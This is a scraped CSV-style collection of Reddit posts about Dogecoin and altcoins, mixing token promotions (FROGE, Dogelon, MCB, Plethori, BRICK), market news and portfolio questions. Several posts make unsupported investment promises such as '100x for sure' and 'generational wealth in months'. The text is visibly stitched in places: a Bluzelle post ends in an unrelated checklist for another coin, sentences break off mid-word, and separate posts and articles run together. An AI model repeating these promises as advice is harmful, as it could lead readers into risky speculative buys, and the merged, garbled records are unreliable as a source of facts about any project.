DOGE,Altcoin,Plethori - Meaningfully Bridging DeFi with Institutional Finance via ETF's -- Micro-cap with platform release THIS QUARTER 10x short/ 100x medium term,"Some of the biggest things keeping institutional and ""normie"" finance largely away from DeFi and focused on large cap coins like Bitcoin and Ethereum are:

* A steep learning curve
* Overwhelming amount of projects and therefore research
* High risk

In traditional finance, these problems are mitigated using ETF's, exchange trade funds. ETF's are a group of assets in a single purchasable share which represents stocks related to specific industries, or bundles designed to minimize risk and hedge different stocks possible failing unexpectedly.

Purchasing an ETF allows you to buy into industries, not just companies, by purchasing a hand picked and weighted basket of goods which is unlikely to produce a loss if the whole industry takes off, but a single company or stock within it fails unexpectedly.

What Plethori brings to DeFi is democratized ETF's for crypto currency assets on Ethereum and PolkaDot blockchain, including wrapped assets such as Bitcoin, and down the road integration of Cardano (when they implement smart contracts).

This means that anyone can now create and share ETF's, earning a percentage of the trading fees associated with that ETF. Savvy investors can let their followers, friends, family invest in all the same things they do with the purchase of a single asset at any price point desired. Top ETF's earn spots on the leaderboard as well as NFT's with special perks to the owners.

Investors with huge capital can invest broadly in new innovations in crypto, like layer 2 scaling, DEXes, smart contracts, by purchasing an ETF with all the relevant cryptos, rather than having to do significant research and manual portfolio balancing and diversification.

This means too that retail investors uneducated in crypto can stop fomo'ing into high risk meme stocks like Doge where they could easily lose money, and instead purchase low risk ETF's which will grow with the entire space. They also plan to build in a fiat gateway to further simplify the path from cash to smart crypto investing.

Plethori brings one of the most powerful tools of traditional finance to DeFi in a way that attracts expert crypto investors, traditional finance, and people completely new to the space. The protocol is built on PolkaDot and utilizes layer 2 so users will not experience the expensive and slow transaction times which plagues so much of DeFi.

The team is fully doxxed, LP is locked, presale locked. DYOR.

DOGE,Altcoin,FROGE - ACQUIRE GENERATIONAL WEALTH IN MONTHS. GET IN GREEN,"FROGE is the worlds first Ecodefi. It is four weeks old and an absolute gem with a x100 potential. The token was launched as a charity token for Cool Earth. After that, the community adopted it and is dedicated to making it moon, saving the rainforest AND your wallet. Every small FROGE buy equals a saved tree.

Like DOGE, FROGE is a memecoin. Unlike DOGE, FROGE is deflationary and charitable. That’s why some also call us DOGE 3.0. FROGE intends to dominate the ecodefi segment of crypto. FROGE is the worlds FIRST ecodefi and leading in sustainability crypto.

Tokenomics are pretty simple:
- 1% of every txn is distributed to all holders
- 1% of every txn goes to the burn wallet
- 0,1% of every txn goes to charity Cool Earth
- 50% of tokens were burned at launch

There is no dev/marketing wallet, all initiatives are financed by the community. Why is FROGE going to moon? Simple. The community is never ever going to give up and is enlisting influencers and developers. If FROGE gets some visibility, normies will hop on en masse.

Milestones:
- Listed on Coingecko, CMC
- Listed on Whitebit (buy with no gas fees)

Current initiatives:
- Building FROGESWAP (BSC bridge)
- Listing on PancakeSwap next
- Launching a new twitter offensive
- Giveaway of 100 million FROGE (ask for info in the telegram)
- froge.community
- China wechat marketing
- Working on FROGE farming

DOGE,Altcoin,Reasons why MCB is a 100x coin from this point,"First and foremost perpetual derivative market is huge and if it's decentralized like MCB and on L2 like arbitrum there can not be anything better than that! having said that here is my quick wirte up on why i think we will see 100x on MCB sooner than anyone thinks:

* Currently MCB is not on any exchange. But MCB has an AMA on Sep 16th with okex one of biggest exchanges out there. [https://twitter.com/OKEx/status/1437406779953098758?s=20;](https://twitter.com/OKEx/status/1437406779953098758?s=20;) Interestingly, they are not listed there yet so there is big possibility of the listing or atleast an announcement to be listed there. Moreover, they recently got approval from community votes to hire a renowned agency which helps coins get listed on coinbase. They paid pretty big amount of money to them for this purpose. If they are targeting coinbase all other exchanges like binance. Kukoin, kraken etc will be easier and will follow. Everyone knows what happens when the coins get listed on big exchanges (more reach more volume) It’s just a matter of time for this low cap decentralized perpetuals on arbitrum to go big. Very few decentralized perpetual coins are in the market and on arbitrum L2. Arbitrum’s total value locked is increasing exponentially since it’s launch in Sep (please google). Many people don’t understand the potential yet or don’t know about this coin yet but they’ll after this reaches 100x which will take it to 10 billion market cap. When joke coins like doge can go to 35 billion, 10B is not impossible.

-Liquidity mining/ transaction mining and staking is going live giving more incentives to traders/holders. Starting with MCB/dodo pool then MCB/balancer pool and lots of others coming live.

\- They have big big VC backing them like delphi digital, multiicoin capital etc. and partners are growing fast!. Please refer to their website and scroll down to see: [https://mcdex.io/homepage/](https://mcdex.io/homepage/) .

\- they are very cheap relative to other competitors like perp, dydx. Total value locked on MCB is increasing massively day by day since arbitrum launch. It's just a matter of time!!!

DOGE,Altcoin,Have $500 left to Invest,"Started with $1200, and spent 700 on acquiring XRP, XML, DENT, TRX, ADT, . Bought NXT @ $2, so that didn't pan out for me at all, and to round it out since I didn't have a lot of money to invest I bought a few ENG, QASH and WABI. Also invested in longer hodls hoping to moon I invested into MoonCoin, Reddcoin, XP, DOGE and KIN. All this based on reading recommendations on reddit for the past 2 weeks and researching the coins. So any recommendations will be appreciated along with why you would recommend the coin, as I have come across some coins that I felt had no real purpose then to make money for people invested in it from the beginning. Wish I had more money to invest since the beginning but such is life of a student. Also Coinbase wait times are horrible right now so I have time to research some more coins.",12,2018-01-04 07:46:16,26

DOGE,Altcoin,The CryptoQuestion November Bulletin - Important news roundup and free crypto resources for your listening and viewing pleasure,"**About us: CryptoQuestion is an independent platform providing free resources for cryptocurrency investors. From an on-demand Q&A service to online courses, from books to our weekly Moonshot Monday podcast. Visit us at** [**www.cryptoquestion.tech**](http://www.cryptoquestion.tech/)

**Market Overview**

The crypto market continues its new bull run, which re-commenced in July, hitting a new high of $2.7 trillion. Both Bitcoin and Ether also reached all time highs in October. Binance Coin, Tether and Cardano make up the top five by market cap. The Fear and Greed index currently sits at ‘Greed’, which compares to last week’s ‘Extreme Greed’ and last month’s neutral.

**Trending**

**SEC Approves Bitcoin Futures ETF**

After years of false starts the crypto industry finally got its ETF (Exchange Traded Fund). The SEC approved the ProShare Bitcoin Strategy ETF. After two days on the NYSE ProShare’s ETF became the fastest fund ever to reach $1 billion in assets under management. Physically based bitcoin ETFs, where you invest directly in bitcoin, are still waiting approval, but it is a promising start.

**SEC Chairman claims U.S won’t ban crypto**

It came as a relief to the market when Gensler the Chairman of the SEC declared that the U.S would not ban crypto but would seek to better regulate it. Although the final decision would be up to Congress. That regulation is most likely to be focused on the stablecoin market to begin with.

**Walmart enters crypto**

Walmart shoppers can now buy bitcoin at 200 kiosks in its stores. The test is with Coinstar which offers bitcoin at more than 3,000 kiosks.

**Axie Infinity creator raises $152 million**

Axie Infinity is one of the most popular play-ro-earn games on the blockchain commanding a $38 billion valuation (fully diluted). An Investment in the creator rather than the tokens is a telling sign that the tokens do not represent good value. Avoid for now.

**Memecoin mania**

Shiba Inu, the memcoin named after another dog, saw its token rocket in value before falling back after a comment from Musk that he didn't own any. But that comment didn't stop its rise and it is now valued above Dogecoin at $38 billion. Of course that has reignited the search for the next Doge or Shiba, a search we won't be embarking on.

**Squid Games pump and dump**

A token inspired by the Netflix show Squid Games saw its price spiral upwards by 380,000% on its debut. That upwards momentum continued as the price hit $2,861. However the price came crashing down as the founders cashed out with a $12 million profit and left the ‘project’. That my friends is the danger of investing in memecoins and projects with no fundamentals.

**NFT mania**

Coinbase announced it was launching an NFT marketplace focusing initially on Ethereum based NFTs.

**The good and bad of Robinhood**

Robinhood’s announcement that it was launching a crypto wallet hit the share price of Coinbase particularly after they revealed they had already signed up 1 million people to the upcoming product. However Robinhood suffered its own set back a few days later when it reported its quarterly earnings. The main cause of concern was the fall off in crypto trading from $233 million in the previous quarter to $51 million in the current. The shares tanked.

**USDC finds itself under investigation**

One of the leading stable coins, number two behind Tether, was issued with a subpoena from the SEC back in July, only recently coming to light however. It was also disclosed that the investigation continues. USDC announced it was shifting its reserves to only cash and treasuries. It is expected that the SEC will oversee the stablecoin market in the short term, something which will no doubt send shivers up the spine of Tether.

**Tether’s house of cards**

Last month we reported that the SEC is investigating Tether. This month they were hit with a $42.5 million fine by the CFTC. It was also reported in a Bloomberg expose that billions of dollars of client money has been invested in risky crypto projects, something the team at Tether initially denied but was later confirmed by Celsius who benefited from an investment of $1 billion. This is a devastating revelation and is a sure sign that if there was ever a bank run investors would suffer massive losses.

**New York targets DeFi Lending**

Both Nexus and Celsius received cease and desist letters from the New York Attorney General. Nexus and Celsius are lending platforms targeting private investors.

**Finally...**

A new survey suggests 11.4% of adults around the world own crypto. Nigeria, Malaysia and Australia have the highest rate of adoption. Indonesia, Hong Kong, Singapore, India, Philippines, Mexico and the US make up the top 10.

**Staking and Yield Farming**

Each week we provide the latest APRs from leading staking and yield farming platforms together with news from the industry.

Staking and yield farming has been a major driver in the huge growth in the DeFi sector. Investors are being enticed by the massive APRs on offer. Totally new projects tempting investors with returns of 10,000+ % are able to attract a deluge of money from investors who don’t seem concerned with the high risks involved. Our weekly review looks at the best platforms out there and the ones to avoid. We attempt to weed out the platforms that we think won’t stand the test of time.

**A dive into Don’t KYC’s anonymous credit card**

DKYC offers the simplest crypto off-ramp on Binance Smart Chain in the form of anonymous prepaid credit cards. Earn rewards, spend worldwide. With DKYC you no longer need confusing cross-chain conversions or long wait times to realize your crypto earnings at 37 million retailers.

The DKYC team plans to release the world’s first fintech NFT series with real utility during Q4 2021. The collection of designs is set to depict financial freedom, anonymity, and promote the quest to eliminate global financial inequality. The NFTs will contain an embedded range of unique financial perks for their owners and donations to relevant charities. Moreover, an in-built staking system will generate rewards while the NFTs are held. These NFTs will be mintable via the DKYC website and eventually tradable on rFind out more on [dontkyc.com](https://dontkyc.com/)

DKYC is launching its new DPay blockchain-based payment solution to connect the Binance Smart Chain to real-world spending without merchant fees or proprietary hardware. DPay allows users to spend their tokens directly from the Binance Smart Chain (BSC). With DKYC and DPay, users won’t need to disclose their shopping behaviors, pay exorbitant merchant fees, or wait around for payments to be confirmed.

DOGE,Altcoin,Bluzelle-DECENTRALIZED DATABASE SERVICE FOR DAPPS,"Bluzelle is a decentralized database solution for decentralized applications (dApps). It is different from other file storage projects in that Bluzelle focuses on database while other projects focuses on files.

Files are relatively large, of arbitrary size, and their contents are not searchable or structured in any agnostic way. File storage services are optimized to deliver whole files, and lack the granularity required to do search and retrieval within files efficiently.

On the other hand, data fields are typically small, of fixed size, and organized in groups and collections and structures to be searchable, for quick storage and retrieval. Data fields are stored in databases to achieve the best security, performance, and scalability metrics. Databases provide fundamental functions like create, read, update, and delete (CRUD), which are absent from file storage services.

Bluzelle has indicated in their whitepaper that their intended target for marketing to start will be the early adopters and dApp developers that can take advantage of and see value in the Bluzelle network.

Bluzelle database knows exactly what is being asked for and only responds with the needed data, making accessing and changing data more efficient.

Instead of all data being accessed on a single server, or several within the same company, the data will be spread out over as many “Producers” as there are on the network.

The “Producers” are any people or entities worldwide who offer up their resources in the form of CPU, memory, hard drive storage, and network connectivity which is what will enable a swarm of providers.

A swarm is essentially a closely networked group of nodes (computers) that cooperate in providing decentralized access to the aforementioned resources. Bluzelle also plans to have swarms of swarms, with one leader being elected at a given time through which the resources are channeled. This way, should a single node (leader) go down, another one can immediately be “elected” to take its place.

✅ Bitcoin merge mined for security (higher hash rate than BCH)

✅ Fractional tokens and NFTs with unlimited uses with optional notary

✅ Totally decentralised with 44% in masternodes (more to be set up after update no doubt). This also means that coupled with SYS lost to time, there is low circulating supply (610m current, 888m total)

✅ Opt in on chain regulation compliance, uniquely positioned to take advantage of any regulatory measures put in place by any governments. 

✅ Great partnerships (Binance, Matic, and the two biggest blockchain companies in South America Quan and Elint and now Klever)

✅ OG team, survived multi million dollar theft of ICO and bear markets since 2014 and still developing groundbreaking tech. 

✅ Lead Dev developed DOGEs ETH bridge, so DOGE lovers should show some love for this be of the best and visionary Devs in Blockchain (Jag Sidhu). Also the devs helped on the Rosetta API, which means a good relationship with Coinbase...

DOGE,Altcoin,My portfolio - roast me!,"This is my portfolio, 40% in ETH as I'm a believer in ETH 2.0 making ETH the first blockchain with high consumer and institutional adaption, PoS, scalability and so on. 

Rest is a mix of handpicked coins and the top market cap coins. Planning a 40:60 ratio for the time being. Thoughts? Also any particular technologies or niches I am not exposed to? Would love your thougts on that aswell.

The handpicked coins are:

* LTO

Low market cap (\~250th), being used, top 10 on-chain transactions. Check out their partnerships with UN and more on their website.

* LINK

Serves to get exposure to oracle technology. Also a top 10-15 market cap coin.

* CAKE

Because BSC is the alternative to Ethereum for the time being. PancakeSwap has higher volume than Uniswap recently. Kind of a hedge against ETH also?

* BAT

For the disruptive potential on the whole online experience and already solid adaption. Users are increasing every week.

* UNI

Because it is the largest DEX, to get exposure to true DeFi as opposed to XRP, BNB, CAKE that are all centralized in some way.

I have also chosen to ban some coins (subject to change), these are:

DOGE, BCH, LTC

These coins have in common that their primary usecase is as payment tokens.

The rest (BNB, XRP, ADA and DOT) are the top market cap coins excluding BTC that I don't already hold.

DOGE,Altcoin,"🚀 DOGELON 🚀 - UNISWAP PROJECT - $ELON - DOGELON, LISTED ON CMC & CoinGecko on the first day - 6M liquidity and 50+M volume already! Next 100x for sure!","What is Dogelon?

Dogelon is a fair, universal currency for everyone, everywhere! This is not another useless get rich quick scheme to dump on investors: Dogelon is a real project that will constantly evolve with the crypto scene, beginning with undoing the damage done to investors by scammers, schemers, and bad actors.

Much like colonizing Mars, it's an ambitious goal, and it's understandable that you may have some questions. Keep reading and DYOR because those questions might lead you onto the next rocket launch.

TOKENDogelon is fair!

50% of token supply burned to Vitalik as a gesture of peace:

Following the path of the Shiba Inu, half of the Dogelon (ELON) token supply was immediately burned to Vitalik Buterin, to ensure a fair distribution from the very start.

Dogelon is safe!

50% of token supply locked in Uniswap liquidity pool:

Half of the token supply was immediately added to the Uniswap ELON and ETH pair then burned, permananetly locking liquidity in Uniswap for trading. This ensures there is no way to remove any starting liquidity from the Uniswap pool, removing any possibility of initial liquidity drawdown by the dev. This means NO RUGS.

Dogelon is less risky!

1,000,000,000,000,000 ELON were created.

50 percent were sent to Vitalik Buterin.

50 percent were permanently locked with Ether on Uniswap.

These tokenomics ensure stable economic activity backed by a highly liquid Uniswap pool. This high level of liquidity means that the coin is less vulnerable to manipulation or large dumps. Dogelon is therefore less risky to invest in, because this prevents your principal from disappearing in a single sell.

Dogelon is fun and caring!

The community is encouraged to airdrop Dogelon tokens to victims of rugs and scams. Our community runs on trust and it's up to everyone in the Dogelon ecosystem to be a part of the effort to build and maintain that trust. Devs so far have demonstrated an amazing amount of activity and trustworthiness, and the community has responded in kind.

Dogelon is profitable!

There has already been 15 million in volume in under 8 hours! Not only that, but within the first 8 hours of launch, we have already seen CoinMarketCap and CoinGecko listings! This is THE next DOGE, hop on board while you still can, because the mission to Mars will not wait for late boarding!

DOGE,Altcoin,"Angry at what Elon did ? Throw A $BRICK at his FACE! And show him how to make real gains! 🧱 TheCryptoBricks 🧱 is a BSC gaming project inspired by /r/place ! 80K Marketcap, 150+ Holders"," 

Some of you may know the **original** [r/place](https://www.reddit.com/r/place/) project where users were able to **place a pixel on an online canvas and color it** every 10 minutes. Communities of reddit and beyond **massively rallied** to **draw** their **emblems** and various **memes** on it.

To   this day an archive is available where you can see the final canvas   (google it). As you can see there isn't any many cryptocurrencies on it,   not even Dogecoin. It's because [r/place](https://www.reddit.com/r/place/) ended on **april 2017**, the crypto sphere wasn't as active as it is today. Today, the canvas would certainly be massively invaded by memes coins.

Introducing [**thecryptobricks.com**](https://thecryptobricks.com/) and their **#TheCryptoWall** project. It's a blockchain successor to [r/place](https://www.reddit.com/r/place/). This time around, it's not about placing pixels on a canvas, but it's about placing **BRICKS**   that you can color as well (technically the same). The concept is that   each pixel on the website is actually backed by a BEP-20 Token on the   Binance Smart Chain.

What's actually **mind blowing** is that every **BRICK** **must be placed on top of another one** (expect for the bottom ones as explained on the website). This means that **if someone withdraw/sells** their $BRICK, **every BRICKs on top of it will fall**, potentially ruining drawings.

**Just imagine the craziness if a community like** [r/doge](https://www.reddit.com/r/doge/) **would be fighting against the** [r/safemoon](https://www.reddit.com/r/safemoon/) **community.** This will give a **huge incentive** for communities to hold onto theirs **$BRICK**, otherwise drawings will be ruined.

🧱 This could be HUGE since I can't think of any other BSC token with such an original project. 🧱

Hello Reddit!

First time posting here!

I wanted to share a creation I thought people in this subreddit might be interested in.

A buddy and I recently stepped into the Crpyto world and both purchased Ledger Nano X's. After finally getting all of our crypto transferred over we were faced with

the task of finding a place for our secret pass phrases.

As we both talked about getting those steel metal wallets and the idea came up to engrave the words into wood with my buddies 

laser engraver. This seemed like a fairly reasonable project. Due to it being wood we of course got  steel ones as well in case of a fire because

you know..wood and all. Added a hanger to hang it on the wall with the passphrase numbers up against the wall and the Doge logo, QR code, and wallet address facing out

for quick scans if needed which works flawlessly by the way.

I just wanted to share the project with anyone who may be interested in doing the same.

I found this app that was able to convert the words to numbers and encrypt it with Bip39 so I felt comfortable sharing since the actual words aren’t there.

If you have any questions on the process I would be more than happy to answer them to the best of my abilities!

Have a great day!

I could have sworn that there was an alt called DODGE, however now I’m realising I may have been thinking about DASH, the logo rings a bell and I certainly remember looking into DASH a while back. Was there ever a crypto called Dodgecoin or am I getting mixed up.

# What the Devs are Doing (3/30/21)

📷

\- A lot of work on the DAO-like structure and Hoge Finance company structure. Still boring to you, but consider this the great experiment in DeFi of our modern times. Olivier & Andreea are huge assets here, they both have clear vision on how to get the CORE team and developers a business model, while at the same time allowing the community it's freedom.

\- The structure of those two companies will determine how VC and institutional investment interact with the Hoge community, so we want to be real careful. It would be terrible if a company with aggressive business practices gains a voting share and uses it to gut the community. Priority #1 is you are free to use hoge as best you can, and nobody becomes liable through legal loopholes.

\- In a similar vein, everybody expects the 10x pump, nobody expects the 2000x pump. At CORE we've been spending a lot of time on how to manage projects and people that build up the community. That means a little more boring stuff like JIRA boards or what-have-you. My ultimate aim is to make HOGE so boring to work for that nobody will want control, and instead you would want to be in the community, working on your own project! The tools we build are just to help you, not us.

\- I think some of you were shocked to see MarpAll as CEO? True he has been busy, with lawyer meetings and more. He hasn't spent much time in the community for a month now. His vision is solid, and I trust him with all my wallet. He's been here since the beginning, and I hope to drag him into a voice AMA soon. I'm pretty sure his every other sentence is, ""But I do not care about me, I just want this to be good for the community.""

\- For trust, it may seem like we are asking you to trust us with the direction of this project. That is not so. This is to explore the boundaries of Decentralized Finance. Specifically:

\- Can the project leaders remain anonymous? Ultimately no, they must be known to business entities that interact with Hoge. But more generally, perhaps?

\- Is there a structure of work beyond straight Democracy (Snap/voting) that allows us to build the tools needed, while preserving the decentralized aspect?

\- Can DeFi be a model for developing companies, countries?

\- What is the long term evolution of the token, and can it sail the stormy seas of crypto to a sustainable model?

\- Finally, if we peel back the layers Hoge, it is currently running as a Democratic Republic, where you vote via influence in the community. We only represent your interests, and the DAO-like company will carve that into stone. I aim to reserve all powers not specifically enumerated in the contract to the people. So that you may carry this on without us when that time comes.",3,2021-03-31 05:19:18,1

DOGE,CryptoCurrencyTrading,Will Dogecoin be finalized for Twitter payments?,"Hey, does anyone know what's happening with Dogecoin and its potential to become a Twitter payment method?  


The lack of official information has generated doubt among the community, but advocates remain optimistic that Dogecoin might be included in Twitter’s payment choices.  


Despite skepticism about its viability as a currency, the previous month has been quite active, as seen by CoinMarketCap.   


I decided this year to pay more attention to Dogecoin and several gaming coins such as Mana, MagicCraft, Gala, and Atlas.  


What do you think about Dogecoin as a Twitter payment method?   


I believe that if Musk mentions Dogecoin again, it may spark a rush in demand, increasing its value.  


Despite the absence of formal information on its prospective inclusion in Twitter payments. Dogecoin’s community support and Musk’s curiosity might catapult it to wider acceptance as a payment mechanism.",8,2023-05-09 22:52:38,12

DOGE,CryptoCurrencyTrading,After SpaceX's Starship explodes Dogecoin price fell,"SpaceX's Starship launched today from a spaceport in Texas. After reaching an altitude of 38 kilometers, the ship went into an uncontrolled spin and exploded. From what I've heard there were problems with the separation of the first stage.  


Against the background of the event, the price of Dogecoin, the cryptocurrency associated with the founder of SpaceX, Elon Musk, fell by almost 5%.  


It's interesting to note that in addition to the direct connection between SpaceX and self-proclaimed ""Dogefather"" Elon Musk, the fact that the launch took place today is a separate significant occasion. The fact is that the 20th day of the 4th month of the year is referred to as ""Dogeday"" by most meme cryptocurrency enthusiasts.   


However, it's still and it will be one of my fav and most interesting crypto assets that I invested in, alongside Windfall tokens tbh.   


Remember the putting of a literal Dogecoin on the literal moon that was promised by Musk two years ago? Well, I guess we will probably have to wait.  


Anyways, Happy Dogeday guys!",10,2023-04-20 19:10:17,2

DOGE,CryptoCurrencyTrading,Impact of Musk's stepping down as Twitter CEO on Dogecoin?,"I read that Musk announced on Thursday that he has found a new chief executive for the struggling social media platform. The CEO, whose name Musk did not reveal but said that it is a woman, will be starting in approximately six weeks.  
  
Upon the announcement, the value of Dogecoin experienced a temporary dip, initially dropping 1.57%. However, the meme coin has since managed to recover some of the losses, although it remains down 3.79% for the day and is currently trading at $0.070296.  
  
I'm wondering how will this decision affect Dogecoin, what do you think?  
  
Since I've been focusing more on GameFi and Metaverse projects lately—MagicCraft is my current favorite, it seemed like a lifetime before I bought any coin, recently I bought Dogecoin. But now that I have, I'm keeping an eye on every situation like this with regard to Dogecoin, lol.  
  
I even saw that the official account of Floki asked him what will become of the """"former CEO"""" — Musk's Shiba Inu puppy named Floki after a character from the popular """"Vikings"""" TV series.   
  
Initially, Musk announced that his """"doge"""" would be the head of Twitter. That pushed the DOGE price higher and provoked a hilarious reaction from the community.",6,2023-05-12 12:31:54,0

DOGE,CryptoCurrencyTrading,Robinhood dominating the Dogecoin network," I read that Robinhood has recently secured its place as the biggest holder of Dogecoin in the world.   


The company currently holds 33,562,118,378 DOGE, which is equivalent to $2,515,849,956 USD, or 24.25% of the circulating supply. This is a significant increase from just a few months ago when the company held only a fraction of this amount.  


The recent accumulation of Dogecoin by Robinhood has sparked speculation that the company may be preparing for a significant move in the cryptocurrency market.   


Some analysts believe that the company's massive holdings of Dogecoin could lead to a significant increase in the cryptocurrency's price. What do you think about that?  


I'll keep my eyes on this with Toshi Tools since it seems that this is going to be a really nice year for DOGE.

DOGE,CryptoCurrencyTrading,Elon Musk Says Spacex Will Soon Accept Dogecoin for Merchandise. Could Dogecoin become A global Means of Payment?,"Tesla CEO Elon Musk revealed through Twitter on Friday that Spacex will soon accept Dogecoin for items, giving the parody cryptocurrency a boost. ""Tesla merch can be bought with DOGE, soon Spacex merch too,"" the Spacex CEO tweeted.

Furthermore, Musk stated that subscriptions to SpaceX's Starlink service may ""one day"" be paid with dogecoin. According to their website, Starlink provides ""high-speed, low-latency broadband internet in remote and rural locations around the world.""

The price of the meme cryptocurrency skyrocketed after Musk's tweet about SpaceX accepting dogecoin. DOGE was trading at $0.078399 per coin at the time of his tweet. It immediately climbed to $0.084927, a gain of more than 8%. The meme coin, however, quickly lost most of its gains. 

Tesla began accepting dogecoin payments for some products in January, but it presently does not accept any other cryptocurrencies. Due to environmental concerns, the company no longer accepts bitcoin as payment for products. Musk stated in June of last year that Tesla will resume accepting BTC whenever miners can demonstrate that they are using 50 percent clean energy. He has not, however, returned to the subject.

Musk has long been a backer of the dogecoin cryptocurrency. In the crypto community, he is known as the Dogefather. 
In May, the Spacex CEO stated that dogecoin has currency potential, whereas bitcoin is better suited as a store of value.



In my opinion Dogecoin could very well become an important means of payment in the global financial system. The nature of Doge's technology makes it better suited as a currency compared to other top cryptocurrencies which are better suited to act as a store of value. Our society is constantly advancing which is embodied by increased adoption of blockchain technology and other innovative technological advancement. Thus digital transactions and the use of cryptocurrencies is only bound to become the global norm. 


The blockchain ecosystem continues growing with innovative projects that could very change how diverse industries operate such as Silks a blockchain-based metaverse that enables users to own, trade, and profit from thoroughbred racing horses, Shiryo is a P2E Card trading game in the metaverse that allows users to hold their cards as NFTsbased on the Ethereum network, Sandbox is like the metaverse-equivalent of MineCraft in terms of its design and functionality. It like a real estate on the metaverse, Decentraland  an online world that allows users to create their own avatars and purchase plots of virtual land. I think as  blockchain technology is increasingly adopted in diverse industries such as the finance and real estate and  as more people adopt the use of cryptocurrencies   so would the value of cryptocurrencies increase and stabilize. 
As this occurs Dogecoin would increasingly be accepted as a means of payment.

DOGE,CryptoCurrencyTrading,Dogecoin Jumps As Elon Joins Twitter's Board,"The price of Dogecoin grew about 14% on Tuesday after Twitter (NYSE: TWTR) announced that Elon Musk will be joining the board of directors.

Details: A day after Musk announced that he bought a 9% stake in Twitter, the social media giant disclosed in a filing that Musk will join the company’s board. There is a provision that Musk cannot own more than 14.9% of the company’s stock.

Background: Dogecoin, seen by some as the ultimate meme coin, soared in popularity last year thanks in part to Musk who publicly endorsed the cryptocurrency on social media.

Recent History: In the past few months, Dogecoin has been down. Tuesday’s gains were a pleasant surprise.

Final Thoughts: And even though Dogecoin had a spectacular day, the prices of most other cryptos dropped on Tuesday.

DOGE,CryptoCurrencyTrading,Dogecoin has plummeted over 9% overnight,"What do you think about the latest news about Dogecoin, which has plummeted over 9% overnight? What should that mean?  


Following the most recent decline, DOGE is currently trading at about $0.088. The token has been under the hands of bears for the past week as well. Dogecoin has dropped roughly 16% over the last seven days.  


DOGE generated the third-most liquidations on the last day, after Ethereum and Bitcoin.  


A total of $6.34 million in DOGE liquidations, the majority of which took place on the cryptocurrency exchange Binance, was reported by Coinglass. The last 12 hours saw the liquidation of about half of all liquidations ($3.79 million).  


What about gossip that Elon Musk wants Twitter Blue subscriptions to be paid in Dogecoin, is that gonna happen or is it just another gossip?   


I sincerely hope that 2023 is gonna be a lot better. I went to Fasset yesterday and noticed that there are a lot of options, especially since 2023 is quickly approaching and people are beginning to believe that it will bring some changes.  


But what I've heard is that among the top 10 largest cryptocurrencies, Dogecoin is the biggest loser, but it's not the only digital asset to lose ground.  


Bitcoin and Ethereum both had losses on the previous day of 1.4% and 2.2%, respectively. The biggest cryptocurrency on the market is currently selling for slightly under $17,000, while Ethereum is changing hands for $1,246.

OMNOM was launched on August 10,2022. During the initial launch, 69% of the supply was burned to Vitalik Buterin's wallet, and the remaining 31% of the supply has been added to a pool on Dogeswap.

**How To Buy Doge Eat Doge ($OMNOM)?**

Follow the tutorial bellow:

[**https://web3walrus.com/how-to-set-up-dogechain/**](https://web3walrus.com/how-to-set-up-dogechain/)

**What is Dogechain?**

Dogechain is an EVM-compatible blockchain built using [Polygon SDK](https://polygon.technology/) to create an efficient connection between Dogecoin (DOGE) and Web3. Dogechain’s infrastructure allows DOGE holders to port their DOGE into a blockchain with more possibilities and embrace more opportunities using their DOGE.

Dogechain presents to developers a platform to build DeFi, GameFi, NFTplatforms, and other decentralized applications with DOGE as part of its core economic system. Being [EVM](https://www.coingecko.com/en/glossary/ethereum-virtual-machine-evm)(Ethereum Virtual Machine) compatible, developers on Ethereum and other EVM blockchains can easily build new applications or bridge their existing applications to Dogechain without changing their original code or learning new programming languages

Dogechain runs the Proof of Stake (PoS)algorithm and offers a scalable, fast, and cheap blockchain to DOGE holders who wish to explore more use cases for their DOGE and the rest of the cryptocurrency community as well. The Dogechain community hopes to build gilt-edge NFT, DeFi, and Web3 platforms and also maintain the core characteristics of the original DOGE community.

**How Does Dogechain Work?**

The only peculiar feature of the Dogechain is interactivity features that enable a connection with the DOGE blockchain. Apart from this, Dogechain is similar to Polygon chain and other EVM-compatible PoS chains.

Moving your DOGE to Dogechain involves a special bridging process that allows you to wrap your DOGEs. The wrapping process enables you to create a new token pegged to the value of DOGE on Dogechain. For instance, when you wrap 100 DOGE using Dogechain’s bridging facility, you will receive 100 wrapped doge (wDOGE) on your Dogechain wallet. The wrapped DOGE is pegged to the value of DOGE and can be easily inter-bridged across both platforms.

Relative to DOGE, wDOGE on Dogechain can be used for blockchain governance, payment of transaction fees, and as utility tokens on Web3 platforms

**In 2021, meme-based crypto assets skyrocketed in value following the lead of the original meme crypto-asset dogecoin’s massive gains. This week a great number of digital currencies have rebounded in price but a slew of popular meme tokens are not doing so hot this week. However, one specific meme-crypto called “cake monster” has jumped 112% in value during the last 24 hours.**

# Dogecoin and Shiba Inu Markets Have Seen Better Days

Bitcoin.com has covered a wide variety of meme-based cryptocurrencies that followed the ‘Dogefather’s’ 8,818% one-year gains. [Dogecoin (DOGE)](https://markets.bitcoin.com/crypto/DOGE) has seen a triumphant rise in 2021 thanks to mainstream media coverage and shoutouts from the Tesla CEO Elon Musk.

[DOGE](https://markets.bitcoin.com/crypto/DOGE) has gained 36.5% during the last month, but dogecoin is down 13% over the course of the week. At the time of writing, a single DOGE is swapping for $0.284508 per unit.

Another meme-asset that took the crypto world by storm is [shiba inu (SHIB)](https://www.coingecko.com/en/coins/shiba-inu) as it has outpaced dogecoin’s gains gathering a whopping 8,750,740% in less than 12 months.

But just like [DOGE](https://markets.bitcoin.com/crypto/DOGE), SHIB is down 14.8% during the last seven days. SHIB has only gained 16.6% during the last 30 days and at the time of writing a single SHIB exchanges hands for $0.00000721 per token.

# Cake Monster Performance Outshines All the Meme Token Markets

Those two crypto assets are the largest meme-based cryptos in terms of market capitalization as DOGE has a $37 billion market valuation and SHIB has a ​​$3.5 billion capitalization.

This is followed by monacoin ($129M), hoge finance ($74M), yooshi ($60M), cumrocket ($58M), cake monster ($32M), and dogelon mars ($31M). The crypto-token [cake monster (MONSTA)](https://cake.monster/) has been the largest gainer out of all the meme assets in terms of gains.

MONSTA has jumped a whopping [844%](https://www.coingecko.com/en/coins/cake-monster) in seven days and 1,550% over the last two weeks. 30 day stats show cake monster (MONSTA) is up 1,295% during the last month. The Cake Monster team says that the defi protocol is the first to leverage [Gravity Vaults](https://docs.cake.monster/).

Cake is deflationary and transaction fees are continuously added to the Gravity Vault. Furthermore, when the Gravity Vault taps 1 million MONSTA, holders can claim their coins from the defi vault. A single MONSTA is swapping for $0.00538036 per unit at press time.nd kawakami inu (KAWA) is down 47% over the last seven days.",18,2021-08-29 06:35:16,8

